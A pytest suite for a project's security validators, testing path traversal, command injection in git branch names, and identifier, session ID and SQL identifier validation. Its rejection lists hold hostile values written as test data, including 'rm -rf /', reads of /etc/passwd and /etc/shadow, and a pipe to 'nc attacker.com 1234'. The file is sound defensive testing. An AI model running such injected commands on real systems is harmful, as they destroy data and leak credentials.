"""
Security Validator Tests

Comprehensive tests for path traversal prevention, command injection prevention,
and input validation in security_validators.py module.

Tests verify:
- Path traversal attack prevention
- Command injection prevention in branch names
- SQL identifier validation
- Session ID validation
- Input sanitization for safe display
"""

import pytest
from pathlib import Path
import tempfile

from brainworm.utils.security_validators import (
    validate_safe_path,
    validate_branch_name,
    validate_identifier,
    sanitize_for_display,
    validate_file_extension,
    validate_session_id,
    validate_sql_identifier,
)


class TestPathTraversalPrevention:
    """Test path traversal attack prevention"""

    def test_safe_path_within_boundary(self, temp_dir):
        """Test that valid paths within boundary are accepted"""
        base_dir = temp_dir / "project"
        base_dir.mkdir(parents=True)

        safe_file = base_dir / "src" / "file.py"
        safe_file.parent.mkdir(parents=True, exist_ok=True)
        safe_file.touch()

        result = validate_safe_path(safe_file, base_dir)
        # Both paths should resolve to ensure comparison works on macOS (/var vs /private/var)
        assert result.is_relative_to(base_dir.resolve())
        assert result == safe_file.resolve()

    def test_path_traversal_with_dotdot_blocked(self, temp_dir):
        """Test that ../ path traversal attempts are blocked"""
        base_dir = temp_dir / "project"
        base_dir.mkdir(parents=True)

        # Create file outside base_dir to traverse to
        outside_file = temp_dir / "etc" / "passwd"
        outside_file.parent.mkdir(parents=True, exist_ok=True)
        outside_file.touch()

        # Attempt traversal
        malicious_path = base_dir / ".." / "etc" / "passwd"

        with pytest.raises(ValueError, match="Path traversal attempt detected"):
            validate_safe_path(malicious_path, base_dir)

    def test_absolute_path_outside_boundary_blocked(self, temp_dir):
        """Test that absolute paths outside boundary are blocked"""
        base_dir = temp_dir / "project"
        base_dir.mkdir(parents=True)

        outside_path = temp_dir / "outside" / "file.txt"
        outside_path.parent.mkdir(parents=True, exist_ok=True)
        outside_path.touch()

        with pytest.raises(ValueError, match="Path traversal attempt detected"):
            validate_safe_path(outside_path, base_dir)

    def test_symlink_blocked_by_default(self, temp_dir):
        """Test that symlinks are blocked by default for security"""
        base_dir = temp_dir / "project"
        base_dir.mkdir(parents=True)

        real_file = base_dir / "real.txt"
        real_file.touch()

        symlink = base_dir / "link.txt"
        symlink.symlink_to(real_file)

        with pytest.raises(ValueError, match="Symlinks not allowed"):
            validate_safe_path(symlink, base_dir)

    def test_symlink_allowed_when_enabled(self, temp_dir):
        """Test that symlinks can be allowed when explicitly enabled"""
        base_dir = temp_dir / "project"
        base_dir.mkdir(parents=True)

        real_file = base_dir / "real.txt"
        real_file.touch()

        symlink = base_dir / "link.txt"
        symlink.symlink_to(real_file)

        # Should work with allow_symlinks=True
        result = validate_safe_path(symlink, base_dir, allow_symlinks=True)
        # Both paths should resolve to ensure comparison works on macOS (/var vs /private/var)
        assert result.is_relative_to(base_dir.resolve())

    def test_deeply_nested_path_allowed(self, temp_dir):
        """Test that deeply nested valid paths are allowed"""
        base_dir = temp_dir / "project"
        base_dir.mkdir(parents=True)

        deep_path = base_dir / "a" / "b" / "c" / "d" / "e" / "file.txt"
        deep_path.parent.mkdir(parents=True, exist_ok=True)
        deep_path.touch()

        result = validate_safe_path(deep_path, base_dir)
        # Both paths should resolve to ensure comparison works on macOS (/var vs /private/var)
        assert result.is_relative_to(base_dir.resolve())


class TestCommandInjectionPrevention:
    """Test command injection prevention in git operations"""

    def test_valid_branch_names_accepted(self):
        """Test that valid branch names are accepted"""
        valid_branches = [
            "main",
            "develop",
            "feature/add-auth",
            "fix/bug-123",
            "release/v1.0.0",
            "user/jsmith/experiment",
            "FEATURE-123",
            "v2.0.0-rc.1",
        ]

        for branch in valid_branches:
            result = validate_branch_name(branch)
            assert result == branch

    def test_command_injection_attempts_blocked(self):
        """Test that command injection attempts are blocked"""
        malicious_branches = [
            "feature; rm -rf /",
            "feature && cat /etc/passwd",
            "feature | nc attacker.com 1234",
            "feature$(whoami)",
            "feature`id`",
            "feature > /tmp/pwned",
            "feature < /etc/shadow",
            'feature"test"',
            "feature'test'",
            "feature\nrm -rf",
            "feature\\n; ls",
        ]

        for branch in malicious_branches:
            with pytest.raises(ValueError, match="Invalid branch name|dangerous character"):
                validate_branch_name(branch)

    def test_git_invalid_formats_blocked(self):
        """Test that git-invalid branch formats are blocked"""
        invalid_branches = [
            "/feature",           # Cannot start with /
            "feature/",           # Cannot end with /
            "feature//branch",    # Cannot contain //
            "feature@{123}",      # Cannot contain @{
            "feature..branch",    # Cannot contain ..
            "feature.lock",       # Cannot end with .lock
            ".feature",           # Cannot start with .
            "feature.",           # Cannot end with .
            "feature branch",     # No spaces
            "feature\ttab",       # No tabs
        ]

        for branch in invalid_branches:
            with pytest.raises(ValueError, match="Invalid branch name"):
                validate_branch_name(branch)

    def test_empty_branch_name_blocked(self):
        """Test that empty branch names are rejected"""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_branch_name("")

        with pytest.raises(ValueError, match="cannot be empty"):
            validate_branch_name("   ")

    def test_branch_name_length_limit(self):
        """Test that excessively long branch names are rejected"""
        too_long = "a" * 256

        with pytest.raises(ValueError, match="too long"):
            validate_branch_name(too_long)


class TestIdentifierValidation:
    """Test identifier validation for service names, task names, etc."""

    def test_valid_identifiers_accepted(self):
        """Test that valid identifiers are accepted"""
        valid_ids = [
            "service",
            "service-name",
            "service_name",
            "Service123",
            "API-Gateway",
            "auth_service_v2",
        ]

        for identifier in valid_ids:
            result = validate_identifier(identifier)
            assert result == identifier

    def test_invalid_characters_blocked(self):
        """Test that identifiers with invalid characters are blocked"""
        invalid_ids = [
            "service name",    # Space
            "service/name",    # Slash
            "service;name",    # Semicolon
            "service$name",    # Dollar sign
            "service@name",    # At sign
        ]

        for identifier in invalid_ids:
            with pytest.raises(ValueError, match="Invalid identifier"):
                validate_identifier(identifier)

    def test_identifier_length_limit(self):
        """Test that overly long identifiers are rejected"""
        too_long = "a" * 101

        with pytest.raises(ValueError, match="too long"):
            validate_identifier(too_long)

    def test_empty_identifier_blocked(self):
        """Test that empty identifiers are rejected"""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_identifier("")

    def test_hyphen_underscore_control(self):
        """Test control over hyphen and underscore allowance"""
        # Hyphen allowed by default
        validate_identifier("service-name")

        # Hyphen not allowed
        with pytest.raises(ValueError):
            validate_identifier("service-name", allow_hyphen=False)

        # Underscore allowed by default
        validate_identifier("service_name")

        # Underscore not allowed
        with pytest.raises(ValueError):
            validate_identifier("service_name", allow_underscore=False)


class TestSanitizationForDisplay:
    """Test text sanitization for safe display in errors and logs"""

    def test_normal_text_unchanged(self):
        """Test that normal text passes through unchanged"""
        normal_text = "This is normal text with 123 numbers."
        result = sanitize_for_display(normal_text)
        assert result == normal_text

    def test_control_characters_removed(self):
        """Test that control characters are removed"""
        text_with_controls = "Text\x00with\x01control\x1fchars"
        result = sanitize_for_display(text_with_controls)
        assert "\x00" not in result
        assert "\x01" not in result
        assert "\x1f" not in result
        assert result == "Textwithcontrolchars"

    def test_long_text_truncated(self):
        """Test that excessively long text is truncated"""
        long_text = "a" * 600
        result = sanitize_for_display(long_text, max_length=500)
        assert len(result) <= 520  # 500 + "... (truncated)"
        assert "truncated" in result

    def test_newlines_preserved(self):
        """Test that newlines are preserved"""
        text_with_newlines = "Line 1\nLine 2\nLine 3"
        result = sanitize_for_display(text_with_newlines)
        assert "\n" in result
        assert result == text_with_newlines

    def test_empty_string_handled(self):
        """Test that empty strings are handled"""
        result = sanitize_for_display("")
        assert result == ""


class TestFileExtensionValidation:
    """Test file extension validation"""

    def test_allowed_extension_accepted(self, temp_dir):
        """Test that files with allowed extensions are accepted"""
        allowed = ['.json', '.txt', '.md']

        json_file = temp_dir / "data.json"
        result = validate_file_extension(json_file, allowed)
        assert result == json_file

    def test_disallowed_extension_blocked(self, temp_dir):
        """Test that files with disallowed extensions are blocked"""
        allowed = ['.json', '.txt']

        py_file = temp_dir / "script.py"
        with pytest.raises(ValueError, match="Invalid file extension"):
            validate_file_extension(py_file, allowed)

    def test_case_insensitive_matching(self, temp_dir):
        """Test that extension matching is case-insensitive"""
        allowed = ['.json']

        # Uppercase should still work
        json_file = temp_dir / "data.JSON"
        result = validate_file_extension(json_file, allowed)
        assert result == json_file


class TestSessionIDValidation:
    """Test session ID validation"""

    def test_valid_session_ids_accepted(self):
        """Test that valid session IDs are accepted"""
        valid_ids = [
            "a1b2c3d4",                           # 8 chars minimum
            "session-123-abc",                    # With hyphens
            "1234567890abcdef",                   # 16 hex chars
            "a" * 64,                             # 64 chars maximum
            "550e8400-e29b-41d4-a716-446655440000",  # UUID format
        ]

        for session_id in valid_ids:
            result = validate_session_id(session_id)
            assert result == session_id

    def test_invalid_session_ids_blocked(self):
        """Test that invalid session IDs are blocked"""
        invalid_ids = [
            "short",              # Too short (< 8 chars)
            "a" * 65,            # Too long (> 64 chars)
            "session_id",        # Underscore not allowed
            "session id",        # Space not allowed
            "session@id",        # Special chars not allowed
            "session/id",        # Slash not allowed
        ]

        for session_id in invalid_ids:
            with pytest.raises(ValueError, match="Invalid session ID format"):
                validate_session_id(session_id)


class TestSQLIdentifierValidation:
    """Test SQL identifier validation for defense-in-depth"""

    def test_valid_sql_identifiers_accepted(self):
        """Test that valid SQL identifiers are accepted"""
        valid_identifiers = [
            "table_name",
            "column_name",
            "user_id",
            "created_at",
            "_private_col",
        ]

        for identifier in valid_identifiers:
            result = validate_sql_identifier(identifier)
            assert result == identifier

    def test_invalid_sql_identifiers_blocked(self):
        """Test that invalid SQL identifiers are blocked"""
        invalid_identifiers = [
            "123_table",          # Cannot start with number
            "table-name",         # Hyphen not allowed
            "table name",         # Space not allowed
            "table;DROP",         # Semicolon not allowed
            "table'name",         # Quote not allowed
        ]

        for identifier in invalid_identifiers:
            with pytest.raises(ValueError, match="Invalid SQL identifier"):
                validate_sql_identifier(identifier)

    def test_sql_keywords_blocked(self):
        """Test that SQL keywords are blocked as identifiers"""
        sql_keywords = [
            "SELECT",
            "INSERT",
            "UPDATE",
            "DELETE",
            "DROP",
            "UNION",
        ]

        for keyword in sql_keywords:
            with pytest.raises(ValueError, match="SQL keyword not allowed"):
                validate_sql_identifier(keyword)

    def test_sql_identifier_length_limit(self):
        """Test that overly long SQL identifiers are rejected"""
        too_long = "a" * 65

        with pytest.raises(ValueError, match="too long"):
            validate_sql_identifier(too_long)


class TestSecurityValidatorIntegration:
    """Integration tests for security validators in realistic scenarios"""

    def test_hook_environment_path_validation(self, temp_dir):
        """Test path validation in hook environment setup scenario"""
        # Simulate hook_framework.py environment setup
        project_root = temp_dir / "project"
        project_root.mkdir(parents=True)

        # Valid case: hook config within project
        hook_config = project_root / ".brainworm" / "hooks" / "config.json"
        hook_config.parent.mkdir(parents=True, exist_ok=True)
        hook_config.touch()

        validated = validate_safe_path(hook_config, project_root)
        # Both paths should resolve to ensure comparison works on macOS (/var vs /private/var)
        assert validated.is_relative_to(project_root.resolve())

        # Invalid case: attempt to access file outside project
        outside_file = temp_dir / "evil" / "config.json"
        outside_file.parent.mkdir(parents=True, exist_ok=True)
        outside_file.touch()

        with pytest.raises(ValueError, match="Path traversal"):
            validate_safe_path(outside_file, project_root)

    def test_git_branch_creation_injection_prevention(self):
        """Test command injection prevention in git operations"""
        # Valid feature branch
        feature_branch = "feature/user-authentication"
        validated = validate_branch_name(feature_branch)
        assert validated == feature_branch

        # Injection attempt via branch name
        malicious = "feature; git push --force origin main"
        with pytest.raises(ValueError, match="dangerous character"):
            validate_branch_name(malicious)

    def test_task_name_and_service_validation(self):
        """Test identifier validation for task and service names"""
        # Valid task name
        task = "implement-auth-service"
        validated = validate_identifier(task)
        assert validated == task

        # Valid service names
        services = ["auth-service", "api_gateway", "user-db"]
        for service in services:
            validated = validate_identifier(service)
            assert validated == service

        # Invalid: command injection attempt
        malicious_service = "service; rm -rf /"
        with pytest.raises(ValueError):
            validate_identifier(malicious_service)


@pytest.fixture
def temp_dir():
    """Create a temporary directory for testing"""
    with tempfile.TemporaryDirectory() as tmp_dir:
        yield Path(tmp_dir)
